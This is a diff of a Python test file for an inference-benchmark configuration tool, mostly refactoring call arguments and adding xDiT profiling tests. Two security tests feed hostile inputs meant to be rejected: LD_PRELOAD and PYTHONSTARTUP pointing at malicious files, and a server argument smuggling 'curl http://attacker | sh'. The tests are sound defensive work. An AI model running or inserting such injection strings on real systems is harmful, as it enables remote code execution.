@@ -14,6 +14,7 @@ from types import SimpleNamespace
 import pytest
 import yaml
 
+from hyperloom.orchestrator.actions.executors import _profile_setup as profile_setup
 from hyperloom.orchestrator.actions.executors import _workload_envs as we
 from hyperloom.inference_optimizer.grid_server_args import validate_server_args_shell_safe
 
@@ -127,14 +128,13 @@ def test_materialize_remove_args_and_string_unset_env(tmp_path, monkeypatch):
             "SGLANG_REMOVE_ME": "1",
         },
     )
-    bench = _materialize(
-        src,
-        tmp_path / "out",
+    layer = we.LaunchLayer(
         extra_server_args="--variant 4",
         extra_envs={"SGLANG_REMOVE_ME": "override"},
         remove_args="--bad-base",
         unset_envs="SGLANG_REMOVE_ME",
     )
+    bench = _materialize(src, tmp_path / "out", launch=layer)
     envs = bench["envs"]
     assert "--bad-base" not in envs["EXTRA_SGLANG_ARGS"]
     assert "--keep-base 2" in envs["EXTRA_SGLANG_ARGS"]
@@ -163,16 +163,18 @@ def test_materialize_drops_unsafe_env_keys_but_preserves_workload_knobs(tmp_path
     bench = _materialize(
         src,
         tmp_path / "out",
-        extra_envs={
-            "ANTHROPIC_API_KEY": "anthropic-secret",
-            "LD_PRELOAD": "/tmp/evil.so",
-            "LLM_GATEWAY_KEY": "gateway-secret",
-            "OPENAI_API_KEY": "secret",
-            "PYTHONSTARTUP": "/tmp/pwn.py",
-            "SGLANG_USE_AITER": "1",
-            "UNKNOWN_VALID_TUNING_KNOB": "enabled",
-            "BAD-NAME": "dropped",
-        },
+        launch=we.LaunchLayer(
+            extra_envs={
+                "ANTHROPIC_API_KEY": "anthropic-secret",
+                "LD_PRELOAD": "/tmp/evil.so",
+                "LLM_GATEWAY_KEY": "gateway-secret",
+                "OPENAI_API_KEY": "secret",
+                "PYTHONSTARTUP": "/tmp/pwn.py",
+                "SGLANG_USE_AITER": "1",
+                "UNKNOWN_VALID_TUNING_KNOB": "enabled",
+                "BAD-NAME": "dropped",
+            }
+        ),
     )
     envs = bench["envs"]
     assert "ANTHROPIC_API_KEY" not in envs
@@ -198,7 +200,7 @@ def test_materialize_rejects_shell_control_in_server_args(tmp_path, monkeypatch)
         _materialize(
             src,
             tmp_path / "out",
-            extra_server_args="--dtype bfloat16; curl http://attacker | sh",
+            launch=we.LaunchLayer(extra_server_args="--dtype bfloat16; curl http://attacker | sh"),
         )
 
 
@@ -249,7 +251,7 @@ def test_precision_and_gpu_type_no_framework_agent(monkeypatch, tmp_path):
     src.write_text(
         yaml.safe_dump({"benchmark": {"model": "/m", "envs": {}, "benchmark_script": "old.sh"}}), encoding="utf-8"
     )
-    bench = _materialize(src, tmp_path / "out", gpu_type="mi300x")
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(gpu_type="mi300x"))
     assert bench["precision"] == "fp8"
     assert "benchmark_script" not in bench
 
@@ -286,7 +288,7 @@ def test_server_args_merge_existing(monkeypatch, tmp_path):
     _clear_env(monkeypatch)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     src = _write(tmp_path / "cfg.yaml", envs={"EXTRA_SGLANG_ARGS": "--mem-fraction-static 0.9"})
-    bench = _materialize(src, tmp_path / "out", extra_server_args="--chunked-prefill-size 2048")
+    bench = _materialize(src, tmp_path / "out", launch=we.LaunchLayer(extra_server_args="--chunked-prefill-size 2048"))
     merged = bench["envs"]["EXTRA_SGLANG_ARGS"]
     assert "mem-fraction-static" in merged
     assert "chunked-prefill-size" in merged
@@ -296,7 +298,7 @@ def test_mimo_v2_injects_triton_attention(monkeypatch, tmp_path):
     _clear_env(monkeypatch)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     src = _write(tmp_path / "cfg.yaml")
-    bench = _materialize(src, tmp_path / "out", model_path="/path/models/MiMo-V2-7B")
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path="/path/models/MiMo-V2-7B"))
     assert "attention-backend triton" in bench["envs"]["EXTRA_SGLANG_ARGS"]
 
 
@@ -318,7 +320,7 @@ def test_sparse_model_injects_block_size_from_config_vllm(monkeypatch, tmp_path)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
     src = _write(tmp_path / "cfg.yaml", framework="vllm")
-    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
     assert "--block-size 128" in bench["envs"]["EXTRA_VLLM_ARGS"]
 
 
@@ -329,7 +331,7 @@ def test_sparse_block_size_read_from_nested_text_config(monkeypatch, tmp_path):
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=64, nested=True)
     src = _write(tmp_path / "cfg.yaml", framework="vllm")
-    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
     assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]
 
 
@@ -341,7 +343,7 @@ def test_dense_model_no_block_size_injection(monkeypatch, tmp_path):
     d.mkdir()
     (d / "config.json").write_text(json.dumps({"model_type": "llama"}), encoding="utf-8")
     src = _write(tmp_path / "cfg.yaml", framework="vllm")
-    bench = _materialize(src, tmp_path / "out", model_path=str(d))
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=str(d)))
     assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")
 
 
@@ -352,7 +354,7 @@ def test_sparse_model_block_size_not_injected_for_sglang(monkeypatch, tmp_path):
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
     src = _write(tmp_path / "cfg.yaml", framework="sglang")
-    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
+    bench = _materialize(src, tmp_path / "out", target=we.BenchmarkTarget(model_path=model_dir))
     assert "block-size" not in bench["envs"].get("EXTRA_SGLANG_ARGS", "")
     assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")
 
@@ -363,7 +365,12 @@ def test_sparse_model_respects_operator_pinned_block_size(monkeypatch, tmp_path)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
     src = _write(tmp_path / "cfg.yaml", framework="vllm")
-    bench = _materialize(src, tmp_path / "out", model_path=model_dir, extra_server_args="--block-size 64")
+    bench = _materialize(
+        src,
+        tmp_path / "out",
+        launch=we.LaunchLayer(extra_server_args="--block-size 64"),
+        target=we.BenchmarkTarget(model_path=model_dir),
+    )
     assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]
     assert "--block-size 128" not in bench["envs"]["EXTRA_VLLM_ARGS"]
 
@@ -385,16 +392,13 @@ def test_run_eval_defaults_true(monkeypatch, tmp_path):
     assert bench["envs"]["RUN_EVAL"] == "true"
 
 
-def test_run_eval_explicit_false_warns_not_blocks(monkeypatch, tmp_path, caplog):
+def test_run_eval_process_env_false_is_ignored(monkeypatch, tmp_path):
     _clear_env(monkeypatch)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     monkeypatch.setenv("RUN_EVAL", "false")
-    monkeypatch.setattr(we, "_RUN_EVAL_DISABLED_WARN_EMITTED", False)
     src = _write(tmp_path / "cfg.yaml")
-    with caplog.at_level("WARNING"):
-        bench = _materialize(src, tmp_path / "out")
-    assert bench["envs"]["RUN_EVAL"] == "false"
-    assert any("RUN_EVAL is disabled" in r.message for r in caplog.records)
+    bench = _materialize(src, tmp_path / "out")
+    assert bench["envs"]["RUN_EVAL"] == "true"
 
 
 def test_profile_negative_delay_clamped(monkeypatch, tmp_path):
@@ -423,7 +427,7 @@ def test_profile_atom_num_prompts_equals_conc(monkeypatch, tmp_path):
     _clear_env(monkeypatch)
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     monkeypatch.setenv("CONC", "16")
-    monkeypatch.setattr(we, "_atom_tracelens_caps", lambda: we._ATOM_CAPS_NONE)
+    monkeypatch.setattr(profile_setup, "_atom_tracelens_caps", lambda: profile_setup._ATOM_CAPS_NONE)
     src = tmp_path / "cfg.yaml"
     src.write_text(
         yaml.safe_dump({"benchmark": {"framework": "atom", "model": "/m", "envs": {"PROFILE": "1"}}}), encoding="utf-8"
@@ -634,7 +638,7 @@ def test_quality_ref_baseline_establishes(monkeypatch, tmp_path):
     monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
     monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
     src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"XDIT_QUALITY_REF": ""})
-    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
+    bench = _materialize(src, tmp_path / "out", options=we.MaterializeOptions(establish_quality_ref=True))
     assert bench["envs"]["XDIT_QUALITY_REF"] == ""
     assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == "/ref/q.png"
 
@@ -646,7 +650,7 @@ def test_quality_ref_baseline_write_env_override(monkeypatch, tmp_path):
     monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
     monkeypatch.setenv("XDIT_QUALITY_REF_WRITE", "/ref/write.png")
     src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"XDIT_QUALITY_REF": ""})
-    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
+    bench = _materialize(src, tmp_path / "out", options=we.MaterializeOptions(establish_quality_ref=True))
     assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == "/ref/write.png"
 
 
@@ -694,78 +698,10 @@ def test_quality_ref_zero_config_baseline_writes_session_ref(monkeypatch, tmp_pa
     sess = tmp_path / "sess"
     monkeypatch.setenv("INFERENCE_OPTIMIZER_CURRENT_SESSION_DIR", str(sess))
     src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={})
-    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
+    bench = _materialize(src, tmp_path / "out", options=we.MaterializeOptions(establish_quality_ref=True))
     expected = str(sess / "storage" / "quality_ref" / "baseline.png")
     assert bench["envs"]["XDIT_QUALITY_REF"] == ""
     assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == expected
-
-
-def test_agentx_workload_spec_concurrency_tracks_served_conc(monkeypatch, tmp_path):
-    # workload_spec.concurrency is the load GEAK replays with, so it MUST equal
-    # the CONC this recipe serves. apply_agentx_switch() runs before the resolved
-    # CONC is projected into envs, so reading envs would ship the base config's
-    # parser default to GEAK while the recipe served the operator's value -- GEAK
-    # then replays at a different operating point than the baseline it is meant
-    # to beat, and no downstream gate catches it because workload_spec.kind still
-    # reads agentx_trace_replay on both sides. The spec reads the resolved
-    # process env instead, so the two agree by construction.
-    _clear_env(monkeypatch)
-    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
-    monkeypatch.setenv("HYPERLOOM_AGENTX", "1")
-    monkeypatch.setenv("CONC", "8")
-    src = _write(tmp_path / "cfg.yaml", envs={"CONC": 64})
-    bench = _materialize(src, tmp_path / "out")
-    assert bench["envs"]["CONC"] == 8
-    assert bench["workload_spec"]["concurrency"] == 8
-
-
-def test_agentx_workload_spec_publishes_the_conc_scaled_warmup_grace(monkeypatch, tmp_path):
-    """The spec must carry the grace the CLIENT is bounded by, not the raw knob.
-
-    ``apply_agentx_switch`` overwrites ``AGENTX_WARMUP_GRACE_PERIOD`` in ``envs``
-    with the CONC-scaled value, because that is what ``aiperf_client.sh`` hands
-    aiperf as ``--warmup-grace-period``. Publishing before that overwrite would
-    record the operator's raw number in the GEAK handoff while the client ran
-    with the scaled one, so the order of the two is load-bearing.
-    """
-    from hyperloom.orchestrator.actions.executors.baseline import agentx_warmup_grace_sec
-
-    _clear_env(monkeypatch)
-    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
-    monkeypatch.setenv("HYPERLOOM_AGENTX", "1")
-    monkeypatch.setenv("CONC", "32")
-    # A grace declared as measured at CONC=8; warmup is linear in CONC, so the
-    # bound this round runs at is 1800 * 32/8.
-    monkeypatch.setenv("AGENTX_WARMUP_GRACE_PERIOD", "1800")
-    monkeypatch.setenv("AGENTX_WARMUP_GRACE_CONC", "8")
-    src = _write(tmp_path / "cfg.yaml", envs={})
-    bench = _materialize(src, tmp_path / "out")
-
-    scaled = agentx_warmup_grace_sec()
-    assert scaled == 7200, "sanity: the scaling itself, so a failure below is the handoff"
-    assert int(bench["envs"]["AGENTX_WARMUP_GRACE_PERIOD"]) == scaled
-    assert bench["workload_spec"]["warmup_grace_period_s"] == scaled
-
-
-def test_agentx_workload_spec_names_the_axis_the_session_is_graded_on(monkeypatch, tmp_path):
-    """metric_basis must follow the grader, in GEAK's own vocabulary.
-
-    An agentic replay is graded on total token throughput, which runs ~140x its
-    output figure on this corpus, so a handoff naming the output axis would aim
-    GEAK's search at a number the session never scores.
-    """
-    _clear_env(monkeypatch)
-    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
-    monkeypatch.setenv("HYPERLOOM_AGENTX", "1")
-    monkeypatch.delenv("HYPERLOOM_PERF_METRIC", raising=False)
-    src = _write(tmp_path / "cfg.yaml", envs={})
-    bench = _materialize(src, tmp_path / "out")
-    assert bench["workload_spec"]["metric_basis"] == "aggregate_total_token_tok_s"
-
-    # An explicit override wins in both directions, and the basis follows it.
-    monkeypatch.setenv("HYPERLOOM_PERF_METRIC", "output_throughput")
-    bench = _materialize(src, tmp_path / "out2")
-    assert bench["workload_spec"]["metric_basis"] == "aggregate_output_tok_s"
 
 
 def test_the_cli_and_the_orchestrator_read_one_set_of_workload_defaults():
@@ -796,3 +732,154 @@ def test_the_cli_and_the_orchestrator_read_one_set_of_workload_defaults():
     orchestrator_src = Path(we.__file__).read_text(encoding="utf-8")
     assert "inference_optimizer.cli import parser" not in orchestrator_src
     assert "inference_optimizer.cli.parser" not in orchestrator_src
+
+
+# --- xDiT profile materialization: patch gate, flags, and status envs ---
+
+
+def _xdit_profile_bench(tmp_path, monkeypatch, *, patch_ok, workload_args=None):
+    from hyperloom.orchestrator.actions.executors import _server_patcher
+
+    _clear_env(monkeypatch)
+    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
+    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
+    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: patch_ok)
+    envs = {"PROFILE": "1"}
+    if workload_args is not None:
+        envs["EXTRA_XDIT_ARGS"] = workload_args
+    src = tmp_path / "cfg.yaml"
+    src.write_text(
+        yaml.safe_dump({"benchmark": {"framework": "xdit", "model": "/m", "envs": envs}}),
+        encoding="utf-8",
+    )
+    return _materialize(src, tmp_path / "out")
+
+
+def test_xdit_profile_patched_sets_capture_flags(monkeypatch, tmp_path):
+    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True)
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert "--profile_capture_phase" in args
+    assert "--profile_with_stack" in args
+    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "ok"
+    assert "HYPERLOOM_PROFILE_DEGRADED_REASON" not in bench["envs"]
+
+
+def test_xdit_profile_unpatched_falls_back_to_safe_flags(monkeypatch, tmp_path):
+    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=False)
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert "--profile_wait 1" in args
+    assert "--profile_capture_phase" not in args
+    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "unavailable"
+    assert bench["envs"]["HYPERLOOM_PROFILE_DEGRADED_REASON"] == "tracelens_runtime_patch_unavailable"
+
+
+def test_xdit_profile_preserves_config_declared_workload_args(monkeypatch, tmp_path):
+    workload = "--model tencent/HunyuanVideo --num_frames 5 --num_inference_steps 4"
+    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True, workload_args=workload)
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert "--model tencent/HunyuanVideo" in args
+    assert "--num_frames 5" in args
+    assert "--num_inference_steps 4" in args
+    assert "--profile_capture_phase" in args
+
+
+def test_xdit_profile_append_is_idempotent_on_rematerialization(monkeypatch, tmp_path):
+    workload = "--model tencent/HunyuanVideo --num_frames 5 --num_inference_steps 4"
+    already_profiled = f"{workload} --profile_wait 1 --profile_capture_phase --profile_with_stack"
+    bench = _xdit_profile_bench(tmp_path, monkeypatch, patch_ok=True, workload_args=already_profiled)
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert args.count("--profile_wait") == 1
+    assert args.count("--profile_capture_phase") == 1
+    assert "--model tencent/HunyuanVideo" in args
+
+
+def test_xdit_profile_kill_switch_skips_patcher(monkeypatch, tmp_path):
+    from hyperloom.orchestrator.actions.executors import _server_patcher
+
+    _clear_env(monkeypatch)
+    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
+    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "0")
+    called = []
+    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: called.append(1) or True)
+    src = tmp_path / "cfg.yaml"
+    src.write_text(
+        yaml.safe_dump({"benchmark": {"framework": "xdit", "model": "/m", "envs": {"PROFILE": "1"}}}),
+        encoding="utf-8",
+    )
+    bench = _materialize(src, tmp_path / "out")
+    assert not called
+    assert "--profile_capture_phase" not in bench["envs"].get("EXTRA_XDIT_ARGS", "")
+    assert bench["envs"]["HYPERLOOM_TRACELENS_PATCH_STATUS"] == "not_attempted"
+
+
+def test_xdit_profile_flags_survive_replace_mode(monkeypatch, tmp_path):
+    """replace_args must not wipe --profile_wait; the re-assertion restores it.
+
+    The base YAML carries --num_inference_steps 4 so the test can verify
+    that only the profiler flags are restored, not the entire pre-replace string.
+    """
+    from hyperloom.orchestrator.actions.executors import _server_patcher
+
+    _clear_env(monkeypatch)
+    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
+    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
+    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: True)
+    src = tmp_path / "cfg.yaml"
+    src.write_text(
+        yaml.safe_dump(
+            {
+                "benchmark": {
+                    "framework": "xdit",
+                    "model": "/m",
+                    "envs": {"PROFILE": "1", "EXTRA_XDIT_ARGS": "--num_inference_steps 4"},
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    bench = _materialize(
+        src,
+        tmp_path / "out",
+        launch=we.LaunchLayer(extra_server_args="--use_cfg_parallel", args_mode="replace"),
+    )
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert "--profile_wait 1" in args
+    assert "--profile_capture_phase" in args
+    assert "--use_cfg_parallel" in args
+    assert "--num_inference_steps" not in args
+
+
+def test_xdit_profile_replace_with_existing_profile_wait(monkeypatch, tmp_path):
+    """Source already carries --profile_wait; replace must still restore all flags."""
+    from hyperloom.orchestrator.actions.executors import _server_patcher
+
+    _clear_env(monkeypatch)
+    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
+    monkeypatch.setenv("HYPERLOOM_ENABLE_PATCH", "1")
+    monkeypatch.setattr(_server_patcher, "ensure_xdit_patched_for_tracelens", lambda *a, **kw: True)
+    src = tmp_path / "cfg.yaml"
+    src.write_text(
+        yaml.safe_dump(
+            {
+                "benchmark": {
+                    "framework": "xdit",
+                    "model": "/m",
+                    "envs": {
+                        "PROFILE": "1",
+                        "EXTRA_XDIT_ARGS": "--profile_wait 1 --profile_capture_phase --profile_with_stack",
+                    },
+                }
+            }
+        ),
+        encoding="utf-8",
+    )
+    bench = _materialize(
+        src,
+        tmp_path / "out",
+        launch=we.LaunchLayer(extra_server_args="--use_cfg_parallel", args_mode="replace"),
+    )
+    args = bench["envs"]["EXTRA_XDIT_ARGS"]
+    assert "--profile_wait 1" in args
+    assert "--profile_capture_phase" in args
+    assert "--profile_with_stack" in args
+    assert "--use_cfg_parallel" in args
